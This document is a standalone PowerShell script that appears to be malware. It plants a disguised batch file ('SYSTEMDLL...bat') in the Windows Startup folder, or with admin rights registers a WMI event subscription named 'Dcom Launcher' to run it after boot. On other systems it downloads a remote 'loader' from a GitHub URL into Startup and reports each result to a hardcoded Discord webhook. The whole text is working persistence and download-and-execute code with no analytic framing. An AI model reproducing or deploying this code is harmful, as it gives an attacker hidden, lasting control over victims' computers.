$temp = $env:TEMP;
$userprof = $env:USERPROFILE;
$startUpFolder = "$userprof\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
$EventFilterName = 'Dcom Launcher';
$load = "$temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.bat";
$uri = "https://discord.com/api/webhooks/971409555361779712/IbhO1R1Oe6utsRnMVBNVLYYeEhse8kJDFYKEKSYVTMVARBSWr2rkInfS7bMwLP-BUb4n";

try {
     

            $path = test-path $load
            if ($PATH -eq $true){
                copy-item $temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.bat -Destination $startUpFolder
                $hash = @{ "content" = "NO PERSISTENCE BAT IN STARTUPk"; }
                $JSON = $hash | convertto-json
                Invoke-RestMethod -uri $uri -Method POST -Body $JSON -Headers @{'Content-Type' = 'application/json'}

            }

            $ADMIN = [Security.Principal.WindowsIdentity]::GetCurrent().Groups -contains 'S-1-5-32-544'
            if($ADMIN -eq $true){
                $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325";
                            $EventFilterArgs = @{
                                EventNamespace = 'root\cimv2'
                                Name = $EventFilterName
                                Query = $Query
                                QueryLanguage = 'WQL'
                            }

                            $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs

                            # Create CommandLineEventConsumer
                            $CommandLineConsumerArgs = @{
                                Name = $EventConsumerName
                                CommandLineTemplate = $load
                            }
                            $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs

                            # Create FilterToConsumerBinding
                            $FilterToConsumerArgs = @{
                                Filter = $Filter
                                Consumer = $Consumer
                            }
                            $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs
                     
            }else{
                $wc = [System.Net.WebClient]::new();
                $loader = "https://raw.githubusercontent.com/ghostleaper/rhino/main/loader";
                $wc.DownloadFile("$loader","$startUpFolder\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.bat");

                $hash = @{ "content" = "SAVED(BAT) PERSISTENCE IN STARTUP"; }
                $JSON = $hash | convertto-json
                Invoke-WebRequest -uri $uri -Method POST -Body $JSON -Headers @{'Content-Type' = 'application/json'}
            }

        }
    catch {
         # catches 404 too
         Write-Debug "StatusCode: $($_.Exception.Response.StatusCode.Value__)"
    }
